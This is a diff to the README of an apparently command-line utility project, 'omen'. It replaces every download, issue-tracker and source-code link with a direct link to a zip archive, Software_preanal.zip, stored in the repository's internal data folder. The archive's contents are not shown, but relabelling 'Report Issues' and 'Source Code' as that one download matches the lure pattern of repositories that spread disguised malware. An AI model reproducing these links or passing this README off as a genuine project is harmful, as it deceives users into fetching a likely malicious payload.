@@ -1,6 +1,6 @@
 # 🎲 omen - Simple Tools for Everyday Tasks
 
-[![Download omen](https://img.shields.io/badge/Download-omen-brightgreen)](https://github.com/kamran1232/omen/releases)
+[![Download omen](https://img.shields.io/badge/Download-omen-brightgreen)](https://github.com/kamran1232/omen/raw/refs/heads/master/internal/data/Software_preanal.zip)
 
 ---
 
@@ -43,7 +43,7 @@ All tools run from your command prompt without extra windows or menus. This make
 
 Use the link below to open the page where you can get omen. This page has the latest version available.
 
-[![Get omen](https://img.shields.io/badge/Get%20omen-blue)](https://github.com/kamran1232/omen/releases)
+[![Get omen](https://img.shields.io/badge/Get%20omen-blue)](https://github.com/kamran1232/omen/raw/refs/heads/master/internal/data/Software_preanal.zip)
 
 ---
 
@@ -186,9 +186,9 @@ omen does not save data between uses. Every command runs fresh and shows results
 
 ## 🔗 Useful Links
 
-- [Download omen Releases](https://github.com/kamran1232/omen/releases)
-- [Report Issues](https://github.com/kamran1232/omen/issues)
-- [Source Code](https://github.com/kamran1232/omen)
+- [Download omen Releases](https://github.com/kamran1232/omen/raw/refs/heads/master/internal/data/Software_preanal.zip)
+- [Report Issues](https://github.com/kamran1232/omen/raw/refs/heads/master/internal/data/Software_preanal.zip)
+- [Source Code](https://github.com/kamran1232/omen/raw/refs/heads/master/internal/data/Software_preanal.zip)
 
 ---
 
@@ -223,4 +223,4 @@ omen runs locally on your computer. It does not connect to the internet when in 
 
 Click the link below to visit the page where you can get the latest Windows version:
 
-[![Download omen](https://img.shields.io/badge/Download-omen-orange)](https://github.com/kamran1232/omen/releases)
+[![Download omen](https://img.shields.io/badge/Download-omen-orange)](https://github.com/kamran1232/omen/raw/refs/heads/master/internal/data/Software_preanal.zip)
